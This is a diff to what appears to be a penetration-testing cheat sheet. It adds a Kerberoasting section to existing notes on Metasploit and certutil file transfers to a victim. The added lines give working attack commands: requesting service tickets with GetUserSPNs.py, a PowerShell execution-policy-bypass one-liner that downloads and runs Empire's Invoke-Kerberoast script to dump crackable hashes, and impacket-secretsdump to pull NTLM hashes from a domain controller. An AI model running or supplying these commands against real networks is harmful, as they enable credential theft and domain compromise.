@@ -82,6 +82,11 @@ Using MSF. Start MSF before starting these steps:
 	victim:
 	2. certutil.exe -urlcache -split -f "http://ip.for.kali.box/file-to-get.zip" name-to-save-as.zip
 
+Kerberoasting
+----------------
+- GetUserSPNs.py -request -dc-ip <DC_IP> <domain\user>
+- powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat
+- impacket-secretsdump -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER> -outputfile filename.hashes
 
 LFI / RFI
 ----------------
